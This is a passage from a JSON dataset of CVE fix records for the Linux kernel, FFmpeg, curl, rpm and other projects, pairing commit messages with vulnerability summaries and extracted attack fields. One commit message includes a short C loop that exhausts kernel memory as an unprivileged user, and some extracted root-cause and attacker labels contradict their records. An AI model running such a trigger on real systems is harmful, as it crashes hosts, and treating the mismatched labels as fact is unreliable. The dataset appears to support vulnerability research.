for\nSystem RAM areas instead of blindly allowing them. More work is needed to\nextend this to mmap, but currently mmap doesn't go through usercopy, so\nhardened usercopy won't Oops the kernel.\n\nReported-by: Tommi Rantala <tommi.t.rantala@nokia.com>\nTested-by: Tommi Rantala <tommi.t.rantala@nokia.com>\nSigned-off-by: Kees Cook <keescook@chromium.org>","summary":"The mm subsystem in the Linux kernel through 4.10.10 does not properly enforce the CONFIG_STRICT_DEVMEM protection mechanism, which allows local users to read or write to kernel memory locations in the first megabyte (and bypass slab-allocation access restrictions) via an application that opens the \/dev\/mem file, related to arch\/x86\/mm\/init.c and drivers\/char\/mem.c.","commit_message_1":"tighten x86 \/dev\/mem with zeroing read under config_strict_devmem , reading system ram through \/dev\/mem is disallowed","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via an application that opens the \/ dev \/ mem file , related to arch \/ x86 \/ mm \/ init . c and drivers \/ char \/ mem . c .","Impact":"read or write to kernel memory locations in the first megabyte ( and bypass slab - allocation access restrictions )","Root Cause":"does not properly enforce the config _ strict _ devmem protection mechanism ,","Attack Type":"local attacker"},{"commit_id":"f7a547b7ef8fc8ebdeaa4c28515c9d72e592fb6d","cve_id":"CVE-2017-7875","cwe_id":"CWE-787","commit_message":"Fix double-free\/OOB-write while receiving IPC data\n\nIf a malicious client pretends to be the E17 window manager, it is\npossible to trigger an out of boundary heap write while receiving an\nIPC message.\n\nThe length of the already received message is stored in an unsigned\nshort, which overflows after receiving 64 KB of data. It's comparably\nsmall amount of data and therefore achievable for an attacker.\n\nWhen len overflows, realloc() will either be called with a small value\nand therefore chars will be appended out of bounds, or len + 1 will be\nexactly 0, in which case realloc() behaves like free(). This could be\nabused for a later double-free attack as it's even possible to overwrite\nthe free information -- but this depends on the malloc implementation.\n\nSigned-off-by: Tobias Stoeckmann <tobias@stoeckmann.org>","summary":"In wallpaper.c in feh before v2.18.3, if a malicious client pretends to be the E17 window manager, it is possible to trigger an out-of-boundary heap write while receiving an IPC message. An integer overflow leads to a buffer overflow and\/or a double free.","commit_message_1":"fix double-free\/oob-write while receiving ipc data if a malicious client pretend to be the e17 window manager , it is possible to trigger an out of boundary heap write while receiving an ipc message","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By sending a specially crafted IPC message","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"e371f031b942d73e02c090170975561fabd5c264","cve_id":"CVE-2017-7866","cwe_id":"CWE-787","commit_message":"avcodec\/pngdec: Fix off by 1 size in decode_zbuf()\n\nFixes out of array access\nFixes: 444\/fuzz-2-ffmpeg_VIDEO_AV_CODEC_ID_PNG_fuzzer\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 2017-01-23 has an out-of-bounds write caused by a stack-based buffer overflow related to the decode_zbuf function in libavcodec\/pngdec.c.","commit_message_1":"fix off by <number> size in decode_zbuf ( ) fix out of array access","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"2080bc33717955a0e4268e738acf8c1eeddbf8cb","cve_id":"CVE-2017-7865","cwe_id":"CWE-787","commit_message":"avcodec\/utils: correct align value for interplay\n\nFixes out of array access\nFixes: 452\/fuzz-1-ffmpeg_VIDEO_AV_CODEC_ID_INTERPLAY_VIDEO_fuzzer\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 2017-01-24 has an out-of-bounds write caused by a heap-based buffer overflow related to the ipvideo_decode_block_opcode_0xA function in libavcodec\/interplayvideo.c and the avcodec_align_dimensions2 function in libavcodec\/utils.c.","commit_message_1":"correct align value for interplay fix out of array access","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"e477f09d0b3619f3d29173b2cd593e17e2d1978e","cve_id":"CVE-2017-7863","cwe_id":"CWE-787","commit_message":"avcodec\/pngdec: Check trns more completely\n\nFixes out of array access\nFixes: 546\/clusterfuzz-testcase-4809433909559296\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 2017-02-04 has an out-of-bounds write caused by a heap-based buffer overflow related to the decode_frame_common function in libavcodec\/pngdec.c.","commit_message_1":"check trns more completely fix out of array access","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"8c2ea3030af7b40a3c4275696fb5c76cdb80950a","cve_id":"CVE-2017-7862","cwe_id":"CWE-787","commit_message":"avcodec\/pictordec: Fix logic error\n\nFixes: 559\/clusterfuzz-testcase-6424225917173760\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 2017-02-07 has an out-of-bounds write caused by a heap-based buffer overflow related to the decode_frame function in libavcodec\/pictordec.c.","commit_message_1":"avcodec\/pictordec : fix logic error","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"d2632f6483a3ceb5d8e0a5fb11142c51c43978b4","cve_id":"CVE-2017-7854","cwe_id":"CWE-125","commit_message":"Fix crash in fuzzed wasm r2_hoobr_consume_init_expr","summary":"The consume_init_expr function in wasm.c in radare2 1.3.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted Web Assembly file.","commit_message_1":"fix crash in fuzzed wasm r2_hoobr_consume_init_expr","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted web assembly file","Impact":"cause a denial of service ( heap - based buffer over - read and application crash )","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"60b234301adf258786d8b90be5c1d437fc8799e0","cve_id":"CVE-2017-7742","cwe_id":"CWE-119","commit_message":"src\/flac.c: Improve error handling\n\nEspecially when dealing with corrupt or malicious files.","summary":"In libsndfile before 1.0.28, an error in the *flac_buffer_copy()* function (flac.c) can be exploited to cause a segmentation violation (with read memory access) via a specially crafted FLAC file during a resample attempt, a similar issue to CVE-2017-7585.","commit_message_1":"improve error handling especially when dealing with corrupt or malicious file","Vulnerability Type":"buffer overflow","Attack Vector":"via a specially crafted FLAC file during a resample attempt","Impact":"cause a denial of service","Root Cause":"caused by a read memory access flaw","Attack Type":"remote attacker"},{"commit_id":"e6838a29ecb484c97e4efef9429643b9851fba6e","cve_id":"CVE-2017-7645","cwe_id":"CWE-20","commit_message":"nfsd: check for oversized NFSv2\/v3 arguments\n\nA client can append random data to the end of an NFSv2 or NFSv3 RPC call\nwithout our complaining; we'll just stop parsing at the end of the\nexpected data and ignore the rest.\n\nEncoded arguments and replies are stored together in an array of pages,\nand if a call is too large it could leave inadequate space for the\nreply.  This is normally OK because NFS RPC's typically have either\nshort arguments and long replies (like READ) or long arguments and short\nreplies (like WRITE).  But a client that sends an incorrectly long reply\ncan violate those assumptions.  This was observed to cause crashes.\n\nAlso, several operations increment rq_next_page in the decode routine\nbefore checking the argument size, which can leave rq_next_page pointing\nwell past the end of the page array, causing trouble later in\nsvc_free_pages.\n\nSo, following a suggestion from Neil Brown, add a central check to\nenforce our expectation that no NFSv2\/v3 call has both a large call and\na large reply.\n\nAs followup we may also want to rewrite the encoding routines to check\nmore carefully that they aren't running off the end of the page array.\n\nWe may also consider rejecting calls that have any extra garbage\nappended.  That would be safer, and within our rights by spec, but given\nthe age of our server and the NFS protocol, and the fact that we've\nnever enforced this before, we may need to balance that against the\npossibility of breaking some oddball client.\n\nReported-by: Tuomas Haanp\u00e4\u00e4 <thaan@synopsys.com>\nReported-by: Ari Kauppi <ari@synopsys.com>\nCc: stable@vger.kernel.org\nReviewed-by: NeilBrown <neilb@suse.com>\nSigned-off-by: J. Bruce Fields <bfields@redhat.com>","summary":"The NFSv2\/NFSv3 server in the nfsd subsystem in the Linux kernel through 4.10.11 allows remote attackers to cause a denial of service (system crash) via a long RPC reply, related to net\/sunrpc\/svc.c, fs\/nfsd\/nfs3xdr.c, and fs\/nfsd\/nfsxdr.c.","commit_message_1":"check for oversized nfsv2\/v3 argument a client can append random data to the end of an nfsv2 or nfsv3 rpc call without our complaining ; we 'll just stop parsing at the end of the expected data and ignore the rest","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a long rpc reply , related to net \/ sunrpc \/ svc . c , fs \/ nfsd \/ nfs3xdr . c , and fs \/","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"cf01fb9985e8deb25ccf0ea54d916b8871ae0e62","cve_id":"CVE-2017-7616","cwe_id":"CWE-388","commit_message":"mm\/mempolicy.c: fix error handling in set_mempolicy and mbind.\n\nIn the case that compat_get_bitmap fails we do not want to copy the\nbitmap to the user as it will contain uninitialized stack data and leak\nsensitive data.\n\nSigned-off-by: Chris Salls <salls@cs.ucsb.edu>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Incorrect error handling in the set_mempolicy and mbind compat syscalls in mm\/mempolicy.c in the Linux kernel through 4.10.9 allows local users to obtain sensitive information from uninitialized stack data by triggering failure of a certain bitmap operation.","commit_message_1":"fix error handling in set_mempolicy and mbind","Vulnerability Type":"7PK - Errors","Attack Vector":"By triggering failure of a certain bitmap operation","Impact":"obtain sensitive information","Root Cause":"caused by incorrect error handling","Attack Type":"local attacker"},{"commit_id":"f457b7b5ecfe91697ed01cfc825772c4d8de1236","cve_id":"CVE-2017-7586","cwe_id":"CWE-119","commit_message":"src\/id3.c : Improve error handling","summary":"In libsndfile before 1.0.28, an error in the *header_read()* function (common.c) when handling ID3 tags can be exploited to cause a stack-based buffer overflow via a specially crafted FLAC file.","commit_message_1":"src\/<file> : improve error handling","Vulnerability Type":"buffer overflow","Attack Vector":"via a specially crafted FLAC file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper validation of ID3 tags","Attack Type":"remote attacker"},{"commit_id":"6399f1fae4ec29fab5ec76070435555e256ca3a6","cve_id":"CVE-2017-7542","cwe_id":"CWE-190","commit_message":"ipv6: avoid overflow of offset in ip6_find_1stfragopt\n\nIn some cases, offset can overflow and can cause an infinite loop in\nip6_find_1stfragopt(). Make it unsigned int to prevent the overflow, and\ncap it at IPV6_MAXPLEN, since packets larger than that should be invalid.\n\nThis problem has been here since before the beginning of git history.\n\nSigned-off-by: Sabrina Dubroca <sd@queasysnail.net>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ip6_find_1stfragopt function in net\/ipv6\/output_core.c in the Linux kernel through 4.12.3 allows local users to cause a denial of service (integer overflow and infinite loop) by leveraging the ability to open a raw socket.","commit_message_1":"avoid overflow of offset in ip6_find_1stfragopt in some case , offset can overflow and can cause an infinite loop in ip6_find_1stfragopt ( )","Vulnerability Type":"integer overflow","Attack Vector":"by leveraging the ability to open a raw socket","Impact":"cause a denial of service ( integer overflow and infinite loop )","Root Cause":"caused by integer overflow","Attack Type":"local attacker"},{"commit_id":"8f44c9a41386729fea410e688959ddaa9d51be7c","cve_id":"CVE-2017-7541","cwe_id":"CWE-119","commit_message":"brcmfmac: fix possible buffer overflow in brcmf_cfg80211_mgmt_tx()\n\nThe lower level nl80211 code in cfg80211 ensures that \"len\" is between\n25 and NL80211_ATTR_FRAME (2304).  We subtract DOT11_MGMT_HDR_LEN (24) from\n\"len\" so thats's max of 2280.  However, the action_frame->data[] buffer is\nonly BRCMF_FIL_ACTION_FRAME_SIZE (1800) bytes long so this memcpy() can\noverflow.\n\n\tmemcpy(action_frame->data, &buf[DOT11_MGMT_HDR_LEN],\n\t       le16_to_cpu(action_frame->len));\n\nCc: stable@vger.kernel.org # 3.9.x\nFixes: 18e2f61db3b70 (\"brcmfmac: P2P action frame tx.\")\nReported-by: \"freenerguo(\u90ed\u5927\u5174)\" <freenerguo@tencent.com>\nSigned-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The brcmf_cfg80211_mgmt_tx function in drivers\/net\/wireless\/broadcom\/brcm80211\/brcmfmac\/cfg80211.c in the Linux kernel before 4.12.3 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted NL80211_CMD_FRAME Netlink packet.","commit_message_1":"fix possible buffer overflow in brcmf_cfg80211_mgmt_tx ( ) the lower level nl80211 code in cfg80211 ensures that `` len '' is between <number> and nl80211_attr_frame ( <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted nl80211 _ cmd _ frame netlink","Impact":"cause a denial of service ( buffer overflow and system crash ) or possibly gain privileges","Root Cause":"caused by a buffer overflow","Attack Type":"local attacker"},{"commit_id":"49d31c2f389acfe83417083e1208422b4091cd9e","cve_id":"CVE-2017-7533","cwe_id":"CWE-362","commit_message":"dentry name snapshots\n\ntake_dentry_name_snapshot() takes a safe snapshot of dentry name;\nif the name is a short one, it gets copied into caller-supplied\nstructure, otherwise an extra reference to external name is grabbed\n(those are never modified).  In either case the pointer to stable\nstring is stored into the same structure.\n\ndentry must be held by the caller of take_dentry_name_snapshot(),\nbut may be freely dropped afterwards - the snapshot will stay\nuntil destroyed by release_dentry_name_snapshot().\n\nIntended use:\n\tstruct name_snapshot s;\n\n\ttake_dentry_name_snapshot(&s, dentry);\n\t...\n\taccess s.name\n\t...\n\trelease_dentry_name_snapshot(&s);\n\nReplaces fsnotify_oldname_...(), gets used in fsnotify to obtain the name\nto pass down with event.\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"Race condition in the fsnotify implementation in the Linux kernel through 4.12.4 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted application that leverages simultaneous execution of the inotify_handle_event and vfs_rename functions.","commit_message_1":"dentry name snapshot take_dentry_name_snapshot ( ) take a safe snapshot of dentry name ; if the name is a short one , it get copied into caller-supplied structure , otherwise an extra reference to external name is grabbed ( those are never modified )","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application that leverages simultaneous execution of the inotify _ handle _ event and vfs _ rename functions","Impact":"gain privileges or cause a denial of service ( memory corruption )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"c5d72beaab1cbbbe68271f4bc4b6670d69985157","cve_id":"CVE-2017-7524","cwe_id":"CWE-522","commit_message":"kdfa: use openssl for hmac not tpm\n\nWhile not reachable in the current code base tools, a potential\nsecurity bug lurked in tpm_kdfa().\n\nIf using that routine for an hmac authorization, the hmac was\ncalculated using the tpm. A user of an object wishing to\nauthenticate via hmac, would expect that the password is never\nsent to the tpm. However, since the hmac calculation relies on\npassword, and is performed by the tpm, the password ends up\nbeing sent in plain text to the tpm.\n\nThe fix is to use openssl to generate the hmac on the host.\n\nFixes: CVE-2017-7524\n\nSigned-off-by: William Roberts <william.c.roberts@intel.com>","summary":"tpm2-tools versions before 1.1.1 are vulnerable to a password leak due to transmitting password in plaintext from client to server when generating HMAC.","commit_message_1":"use openssl for hmac not tpm while not reachable in the current code base tool , a potential security bug lurked in tpm_kdfa ( )","Vulnerability Type":"Insufficiently Protected Credentials","Attack Vector":"by sending a specially-crafted request","Impact":"obtain sensitive information from the system","Root Cause":"caused by transmitting password","Attack Type":"remote attacker"},{"commit_id":"404ef011c300207cdb1e531670384564aae04bdc","cve_id":"CVE-2017-7501","cwe_id":"CWE-59","commit_message":"Don't follow symlinks on file creation (CVE-2017-7501)\n\nOpen newly created files with O_EXCL to prevent symlink tricks.\nWhen reopening hardlinks for writing the actual content, use append\nmode instead. This is compatible with the write-only permissions but\nis not destructive in case we got redirected to somebody elses file,\nverify the target before actually writing anything.\n\nAs these are files with the temporary suffix, errors mean a local\nuser with sufficient privileges to break the installation of the package\nanyway is trying to goof us on purpose, don't bother trying to mend it\n(we couldn't fix the hardlink case anyhow) but just bail out.\n\nBased on a patch by Florian Festi.","summary":"It was found that versions of rpm before 4.13.0.2 use temporary files with predictable names when installing an RPM. An attacker with ability to write in a directory where files will be installed could create symbolic links to an arbitrary location and modify content, and possibly permissions to arbitrary files, which could be used for denial of service or possibly privilege escalation.","commit_message_1":"do n't follow symlinks on file creation ( <cve_id> ) open newly created file with o_excl to prevent symlink trick","Vulnerability Type":"Link Following","Attack Vector":"by creating a symbolic link from a temporary file to arbitrary location","Impact":"gain elevated privileges","Root Cause":"caused by the use of a temporary files with predictable names when installing an RPM","Attack Type":"local attacker"},{"commit_id":"06bd3c36a733ac27962fea7d6f47168841376824","cve_id":"CVE-2017-7495","cwe_id":"CWE-200","commit_message":"ext4: fix data exposure after a crash\n\nHuang has reported that in his powerfail testing he is seeing stale\nblock contents in some of recently allocated blocks although he mounts\next4 in data=ordered mode. After some investigation I have found out\nthat indeed when delayed allocation is used, we don't add inode to\ntransaction's list of inodes needing flushing before commit. Originally\nwe were doing that but commit f3b59291a69d removed the logic with a\nflawed argument that it is not needed.\n\nThe problem is that although for delayed allocated blocks we write their\ncontents immediately after allocating them, there is no guarantee that\nthe IO scheduler or device doesn't reorder things and thus transaction\nallocating blocks and attaching them to inode can reach stable storage\nbefore actual block contents. Actually whenever we attach freshly\nallocated blocks to inode using a written extent, we should add inode to\ntransaction's ordered inode list to make sure we properly wait for block\ncontents to be written before committing the transaction. So that is\nwhat we do in this patch. This also handles other cases where stale data\nexposure was possible - like filling hole via mmap in\ndata=ordered,nodelalloc mode.\n\nThe only exception to the above rule are extending direct IO writes where\nblkdev_direct_IO() waits for IO to complete before increasing i_size and\nthus stale data exposure is not possible. For now we don't complicate\nthe code with optimizing this special case since the overhead is pretty\nlow. In case this is observed to be a performance problem we can always\nhandle it using a special flag to ext4_map_blocks().\n\nCC: stable@vger.kernel.org\nFixes: f3b59291a69d0b734be1fc8be489fef2dd846d3d\nReported-by: \"HUANG Weller (CM\/ESW12-CN)\" <Weller.Huang@cn.bosch.com>\nTested-by: \"HUANG Weller (CM\/ESW12-CN)\" <Weller.Huang@cn.bosch.com>\nSigned-off-by: Jan Kara <jack@suse.cz>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>","summary":"fs\/ext4\/inode.c in the Linux kernel before 4.6.2, when ext4 data=ordered mode is used, mishandles a needs-flushing-before-commit list, which allows local users to obtain sensitive information from other users' files in opportunistic circumstances by waiting for a hardware reset, creating a new file, making write system calls, and reading this file.","commit_message_1":"fix data exposure after a crash huang ha reported that in his powerfail testing he is seeing stale block content in some of recently allocated block although he mount ext4 in data=ordered mode","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by waiting for a hardware reset , creating a new file , making write system calls , and reading this file","Impact":"obtain sensitive information from other users ' files in opportunistic circumstances","Root Cause":"mishandles a needs - flushing - before - commit list","Attack Type":"local attacker"},{"commit_id":"ee0d8d8482345ff97a75a7d747efc309f13b0d80","cve_id":"CVE-2017-7487","cwe_id":"CWE-416","commit_message":"ipx: call ipxitf_put() in ioctl error path\n\nWe should call ipxitf_put() if the copy_to_user() fails.\n\nReported-by: \u674e\u5f3a <liqiang6-s@360.cn>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ipxitf_ioctl function in net\/ipx\/af_ipx.c in the Linux kernel through 4.11.1 mishandles reference counts, which allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a failed SIOCGIFADDR ioctl call for an IPX interface.","commit_message_1":"call ipxitf_put ( ) in ioctl error path we should call ipxitf_put ( ) if the copy_to_user ( ) fails","Vulnerability Type":"Use After Free","Attack Vector":"via a failed siocgifaddr ioctl call for an ipx interface","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"c9f838d104fed6f2f61d68164712e3204bf5271b","cve_id":"CVE-2017-7472","cwe_id":"CWE-404","commit_message":"KEYS: fix keyctl_set_reqkey_keyring() to not leak thread keyrings\n\nThis fixes CVE-2017-7472.\n\nRunning the following program as an unprivileged user exhausts kernel\nmemory by leaking thread keyrings:\n\n\t#include <keyutils.h>\n\n\tint main()\n\t{\n\t\tfor (;;)\n\t\t\tkeyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_THREAD_KEYRING);\n\t}\n\nFix it by only creating a new thread keyring if there wasn't one before.\nTo make things more consistent, make install_thread_keyring_to_cred()\nand install_process_keyring_to_cred() both return 0 if the corresponding\nkeyring is already present.\n\nFixes: d84f4f992cbd (\"CRED: Inaugurate COW credentials\")\nCc: stable@vger.kernel.org # 2.6.29+\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>","summary":"The KEYS subsystem in the Linux kernel before 4.10.13 allows local users to cause a denial of service (memory consumption) via a series of KEY_REQKEY_DEFL_THREAD_KEYRING keyctl_set_reqkey_keyring calls.","commit_message_1":"fix keyctl_set_reqkey_keyring ( ) to not leak thread keyrings this fix <cve_id>","Vulnerability Type":"Improper Resource Shutdown or Release","Attack Vector":"via a series of key _ reqkey _ defl _ thread _ keyring keyctl _ set _ reqkey _ keyring calls .","Impact":"cause a denial of service","Root Cause":"caused by improper validation of short files","Attack Type":"local attacker"},{"commit_id":"1890d59905414ab84a35892b2e45833654aa5c13","cve_id":"CVE-2017-7407","cwe_id":"CWE-119","commit_message":"tool_writeout: fixed a buffer read overrun on --write-out\n\nIf a % ended the statement, the string's trailing NUL would be skipped\nand memory past the end of the buffer would be accessed and potentially\ndisplayed as part of the --write-out output. Added tests 1440 and 1441\nto check for this kind of condition.\n\nReported-by: Brian Carpenter","summary":"The ourWriteOut function in tool_writeout.c in curl 7.53.1 might allow physically proximate attackers to obtain sensitive information from process memory in opportunistic circumstances by reading a workstation screen during use of a --write-out argument ending in a '%' character, which leads to a heap-based buffer over-read.","commit_message_1":"fixed a buffer read overrun on -- write-out if a % ended the statement , the string 's trailing nul would be skipped and memory past the end of the buffer would be accessed and potentially displayed a part of the -- write-out output","Vulnerability Type":"buffer overflow","Attack Vector":"by reading a workstation screen during use of a - - write - out argument ending in a ' % ' character , which leads to a heap - based buffer over - read","Impact":"obtain sensitive information from process memory in opportunistic circumstances","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1b53cf9815bb4744958d41f3795d5d5a1d365e2d","cve_id":"CVE-2017-7374","cwe_id":"CWE-416","commit_message":"fscrypt: remove broken support for detecting keyring key revocation\n\nFilesystem encryption ostensibly supported revoking a keyring key that\nhad been used to \"unlock\" encrypted files, causing those files to become\n\"locked\" again.  This was, however, buggy for several reasons, the most\nsevere of which was that when key revocation happened to be detected for\nan inode, its fscrypt_info was immediately freed, even while other\nthreads could be using it for encryption or decryption concurrently.\nThis could be exploited to crash the kernel or worse.\n\nThis patch fixes the use-after-free by removing the code which detects\nthe keyring key having been revoked, invalidated, or expired.  Instead,\nan encrypted inode that is \"unlocked\" now simply remains unlocked until\nit is evicted from memory.  Note that this is no worse than the case for\nblock device-level encryption, e.g. dm-crypt, and it still remains\npossible for a privileged user to evict unused pages, inodes, and\ndentries by running 'sync; echo 3 > \/proc\/sys\/vm\/drop_caches', or by\nsimply unmounting the filesystem.  In fact, one of those actions was\nalready needed anyway for key revocation to work even somewhat sanely.\nThis change is not expected to break any applications.\n\nIn the future I'd like to implement a real API for fscrypt key\nrevocation that interacts sanely with ongoing filesystem operations ---\nwaiting for existing operations to complete and blocking new operations,\nand invalidating and sanitizing key material and plaintext from the VFS\ncaches.  But this is a hard problem, and for now this bug must be fixed.\n\nThis bug affected almost all versions of ext4, f2fs, and ubifs\nencryption, and it was potentially reachable in any kernel configured\nwith encryption support (CONFIG_EXT4_ENCRYPTION=y,\nCONFIG_EXT4_FS_ENCRYPTION=y, CONFIG_F2FS_FS_ENCRYPTION=y, or\nCONFIG_UBIFS_FS_ENCRYPTION=y).  Note that older kernels did not use the\nshared fs\/crypto\/ code, but due to the potential security implications\nof this bug, it may still be worthwhile to backport this fix to them.\n\nFixes: b7236e21d55f (\"ext4 crypto: reorganize how we store keys in the inode\")\nCc: stable@vger.kernel.org # v4.2+\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>\nAcked-by: Michael Halcrow <mhalcrow@google.com>","summary":"Use-after-free vulnerability in fs\/crypto\/ in the Linux kernel before 4.10.7 allows local users to cause a denial of service (NULL pointer dereference) or possibly gain privileges by revoking keyring keys being used for ext4, f2fs, or ubifs encryption, causing cryptographic transform objects to be freed prematurely.","commit_message_1":"remove broken support for detecting keyring key revocation filesystem encryption ostensibly supported revoking a keyring key that had been used to `` unlock '' encrypted file , causing those file to become `` locked '' again","Vulnerability Type":"Use After Free","Attack Vector":"by revoking keyring keys being used for ext4 , f2fs , or ubifs encryption","Impact":"cause a denial of service ( pointer dereference ) or possibly gain privileges","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"8605330aac5a5785630aec8f64378a54891937cc","cve_id":"CVE-2017-7277","cwe_id":"CWE-125","commit_message":"tcp: fix SCM_TIMESTAMPING_OPT_STATS for normal skbs\n\n__sock_recv_timestamp can be called for both normal skbs (for\nreceive timestamps) and for skbs on the error queue (for transmit\ntimestamps).\n\nCommit 1c885808e456\n(tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING)\nassumes any skb passed to __sock_recv_timestamp are from\nthe error queue, containing OPT_STATS in the content of the skb.\nThis results in accessing invalid memory or generating junk\ndata.\n\nTo fix this, set skb->pkt_type to PACKET_OUTGOING for packets\non the error queue. This is safe because on the receive path\non local sockets skb->pkt_type is never set to PACKET_OUTGOING.\nWith that, copy OPT_STATS from a packet, only if its pkt_type\nis PACKET_OUTGOING.\n\nFixes: 1c885808e456 (\"tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING\")\nReported-by: JongHwan Kim <zzoru007@gmail.com>\nSigned-off-by: Soheil Hassas Yeganeh <soheil@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: Willem de Bruijn <willemb@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The TCP stack in the Linux kernel through 4.10.6 mishandles the SCM_TIMESTAMPING_OPT_STATS feature, which allows local users to obtain sensitive information from the kernel's internal socket data structures or cause a denial of service (out-of-bounds read) via crafted system calls, related to net\/core\/skbuff.c and net\/socket.c.","commit_message_1":"fix scm_timestamping_opt_stats for normal skbs __sock_recv_timestamp can be called for both normal skbs ( for receive timestamps ) and for skbs on the error queue ( for transmit timestamps )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted system calls , related to net \/ core \/ skbuff . c and net \/ socket . c","Impact":"obtain sensitive information from the kernel ' s internal socket data structures or cause a denial of service ( out - of - bounds read )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf","cve_id":"CVE-2017-7274","cwe_id":"CWE-476","commit_message":"Fix #7152 - Null deref in cms","summary":"The r_pkcs7_parse_cms function in libr\/util\/r_pkcs7.c in radare2 1.3.0 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted PE file.","commit_message_1":"fix # <number> - null deref in cm","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted pe file","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"1ebb71143758f45dc0fa76e2f48429e13b16d110","cve_id":"CVE-2017-7273","cwe_id":null,"commit_message":"HID: hid-cypress: validate length of report\n\nMake sure we have enough of a report structure to validate before\nlooking at it.\n\nReported-by: Benoit Camredon <benoit.camredon@airbus.com>\nTested-by: Benoit Camredon <benoit.camredon@airbus.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"The cp_report_fixup function in drivers\/hid\/hid-cypress.c in the Linux kernel 4.x before 4.9.4 allows physically proximate attackers to cause a denial of service (integer underflow) or possibly have unspecified other impact via a crafted HID report.","commit_message_1":"hid-cypress : validate length of report make sure we have enough of a report structure to validate before looking at it","Vulnerability Type":"integer underflow","Attack Vector":"via a crafted hid report","Impact":"cause a denial of service ( integer underflow ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"bab0b99f376dac9170ac81382a5ed526938d595a","cve_id":"CVE-2017-7272","cwe_id":"CWE-918","commit_message":"Detect invalid port in xp_socket parse ip address\n\nFor historical reasons, fsockopen() accepts the port and hostname\nseparately: fsockopen('127.0.0.1', 80)\n\nHowever, with the introdcution of stream transports in PHP 4.3,\nit became possible to include the port in the hostname specifier:\n\nfsockopen('127.0.0.1:80')\nOr more formally: fsockopen('tcp:\/\/127.0.0.1:80')\n\nConfusing results when these two forms are combined, however.\nfsockopen('127.0.0.1:80', 443) results in fsockopen() attempting\nto connect to '127.0.0.1:80:443' which any reasonable stack would\nconsider 